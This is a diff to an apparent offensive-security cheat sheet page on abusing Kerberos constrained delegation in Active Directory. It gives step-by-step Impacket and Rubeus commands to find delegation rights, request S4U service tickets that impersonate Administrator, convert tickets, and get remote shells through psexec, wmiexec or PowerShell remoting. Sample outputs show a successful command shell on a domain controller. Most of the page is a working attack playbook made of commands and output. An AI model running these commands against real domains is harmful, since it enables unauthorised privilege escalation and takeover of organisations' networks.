@@ -6,15 +6,26 @@ tags: ["Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "Allowedtod
 
 ### Privesc #1: Forge a Ticket
 
-{{< tab set1 tab1 active >}}Linux{{< /tab >}}
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 1. Get a service ticket
+#### 1. Pre-Check
 
 ```console
-# For example, spn: www/dc.example.com (Check Bloodhound)
-sudo ntpdate -s <DC> && impacket-getST -dc-ip <DC_IP> -spn <SERVICE>/<TARGET_DOMAIN> -hashes :<HASH> -impersonate Administrator '<DOMAIN>/<USER>'
+# With password
+impacket-findDelegation '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+```
+
+```console
+# With hash
+impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC_IP> -hashes :<HASH> -no-pass
+```
+
+#### 2. Get a Service Ticket
+
+```console
+sudo ntpdate -s <DC> && impacket-getST -dc-ip <DC_IP> -spn '<SERVICE>/<TARGET_DOMAIN>' -hashes :<HASH> -impersonate '<IMPERSONATE_USER>' '<DOMAIN>/<USER>'
 ```
 
 ```console {class="sample-code"}
@@ -29,10 +40,30 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 [*] Saving ticket in Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
 ```
 
-#### 2. Remote
+#### 3. Convert Ticket \[Optional\]
 
 ```console
-export KRB5CCNAME=<CCACHE_FILE>
+python3 rubeustoccache.py '<BASE64_TICKET>' '<IMPERSONATE_USER>.kirbi' '<IMPERSONATE_USER>.ccache'
+```
+
+```console {class="sample-code"}
+python3 ~/Tools/RubeusToCcache/rubeustoccache.py 'doIG9DCCBv ...[SNIP]... 9yZS5jb20=' 'administrator.kirbi' 'administrator.ccache'
+╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
+╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
+╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
+              By Solomon Sklash
+          github.com/SolomonSklash
+   Inspired by Zer1t0's ticket_converter.py
+
+[*] Writing decoded .kirbi file to administrator.kirbi
+[*] Writing converted .ccache file to administrator.ccache
+[*] All done! Don't forget to set your environment variable: export KRB5CCNAME=administrator.ccache
+```
+
+#### 4. Remote
+
+```console
+export KRB5CCNAME='<CCACHE_FILE>'
 ```
 
 ```console {class="sample-code"}
@@ -40,7 +71,30 @@ $ export KRB5CCNAME=Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccach
 ```
 
 ```console
-sudo ntpdate -s <DC> && wmiexec.py -k -no-pass administrator@<DC>
+# psexec
+sudo ntpdate -s <DC> && impacket-psexec '<DOMAIN>/<IMPERSONATE_USER>@<TARGET_DOMAIN>' -k -no-pass
+```
+
+```console {class="sample-code"}
+$ impacket-psexec client.example.com/administrator@dc01.client.example.com -k -no-pass
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Requesting shares on dc01.client.example.com.....
+[*] Found writable share ADMIN$
+[*] Uploading file MOjmtmkC.exe
+[*] Opening SVCManager on dc01.client.example.com.....
+[*] Creating service NTdz on dc01.client.example.com.....
+[*] Starting service NTdz.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+```console
+# wmiexec
+sudo ntpdate -s <DC> && wmiexec.py '<DOMAIN>/<IMPERSONATE_USER>@<TARGET_DOMAIN>' -k -no-pass
 ```
 
 ```console {class="sample-code"}
@@ -58,10 +112,119 @@ C:\>
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
-#### 1. TO-DO
+#### 1. Pre-Check
 
 ```console
-TO-DO
+# Import powerview
+. .\PowerView.ps1
+```
+
+```console
+# Check msds-allowedtodelegateto
+Get-NetUser -TrustedToAuth
+```
+
+{{< tab set1-2 tab1 active >}}Hash{{< /tab >}}{{< tab set1-2 tab2 >}}Kerberos{{< /tab >}}
+{{< tabcontent set1-2 tab1 >}}
+
+#### 2. Calculate Hash
+
+```console
+.\rubeus.exe hash /password:'<PASSWORD>' /user:'<USER>' /domain:<DOMAIN>
+```
+
+#### 3. Get a Service Ticket
+
+```console
+.\rubeus.exe s4u /user:'<USER>' /aes256:<HASH> /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt
+```
+
+```console {class="sample-code"}
+.\rubeus.exe s4u /user:'MS01$' /rc4:7ddf32e17a6ac5ce04a8ecbf782ca509 /impersonateuser:administrator /msdsspn:"cifs/dc01.client.example.com" /nowrap /ptt
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.2 
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: 7ddf32e17a6ac5ce04a8ecbf782ca509
+[*] Building AS-REQ (w/ preauth) for: 'CLIENT.EXAMPLE.COM\MS01$'
+[*] Using domain controller: 172.16.1.2:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFljCCBZKg ...[SNIP]... hPUkUuQ09N
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'MS01$@CLIENT.EXAMPLE.COM'
+[*] Using domain controller: DC04.CLIENT.EXAMPLE.COM (172.16.1.2)
+[*] Sending S4U2self request to 172.16.1.2:88
+[+] S4U2self success!
+[*] Got a TGS for 'administrator' to 'MS01$@CLIENT.EXAMPLE.COM'
+[*] base64(ticket.kirbi):
+
+      doIGGjCCBh ...[SNIP]... cbBU1TMDIk
+
+[*] Impersonating user 'administrator' to target SPN 'cifs/dc01.client.example.com'
+[*] Building S4U2proxy request for service: 'cifs/dc01.client.example.com'
+[*] Using domain controller: DC04.CLIENT.EXAMPLE.COM (172.16.1.2)
+[*] Sending S4U2proxy request to domain controller 172.16.1.2:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc01.client.example.com':
+
+      doIG9DCCBv ...[SNIP]... 9yZS5jb20=
+[+] Ticket successfully imported!
+```
+
+```console
+# Or Create a sacrificial process
+.\rubeus.exe s4u /user:'<USER>' /aes256:<HASH> /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set1-2 tab2 >}}
+
+#### 2. Request a TGT
+
+```console
+.\rubeus.exe tgtdeleg /nowrap /ptt
+```
+
+#### 3. Get a Service Ticket
+
+```console
+.\rubeus.exe s4u /user:'<USER>' /ticket:'<BASE64_TICKET>' /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt
+```
+
+```console
+# Or Create a sacrificial process
+.\rubeus.exe s4u /user:'<USER>' /ticket:'<BASE64_TICKET>' /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
+```
+
+{{< /tabcontent >}}
+
+#### 4. Remote
+
+```console
+# Check
+klist
+```
+
+```console
+# Create session
+$session = new-pssession -computername <COMPUTER_NAME>
+```
+
+```console
+# Execute cmd
+invoke-command $session { <CMD> }
 ```
 
 {{< /tabcontent >}}
